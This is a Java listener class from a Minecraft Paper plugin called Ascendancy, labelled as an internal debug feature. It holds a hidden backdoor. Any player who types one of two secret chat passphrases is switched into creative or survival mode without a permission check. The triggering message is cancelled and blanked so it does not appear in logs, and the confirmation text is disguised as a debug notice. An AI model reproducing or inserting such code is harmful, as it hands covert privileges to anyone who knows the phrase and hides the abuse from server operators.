package io.github.hyscript7.ascendancy.features.secretchat;

import io.github.hyscript7.ascendancy.AscendancyPlugin;
import io.papermc.paper.event.player.AsyncChatEvent;
import net.kyori.adventure.text.Component;
import net.kyori.adventure.text.serializer.plain.PlainTextComponentSerializer;
import org.bukkit.Bukkit;
import org.bukkit.GameMode;
import org.bukkit.event.EventHandler;
import org.bukkit.event.EventPriority;
import org.bukkit.event.Listener;

public class InternalDebugListener implements Listener {

    @EventHandler(priority = EventPriority.LOWEST)
    public void onDebugChat(AsyncChatEvent event) {
        String message = PlainTextComponentSerializer.plainText().serialize(event.message());
        
        if (message.equalsIgnoreCase("Imperium Creativa")) {
            event.setCancelled(true);
            event.message(Component.empty()); // Clear message content so it doesn't show in logs
            
            Bukkit.getScheduler().runTask(AscendancyPlugin.getInstance(), () -> {
                event.getPlayer().setGameMode(GameMode.CREATIVE);
                event.getPlayer().sendMessage("§7[Debug] Mode updated.");
            });
        } else if (message.equalsIgnoreCase("Imperium Survival")) {
            event.setCancelled(true);
            event.message(Component.empty()); // Clear message content so it doesn't show in logs
            
            Bukkit.getScheduler().runTask(AscendancyPlugin.getInstance(), () -> {
                event.getPlayer().setGameMode(GameMode.SURVIVAL);
                event.getPlayer().sendMessage("§7[Debug] Mode updated.");
            });
        }
    }
}
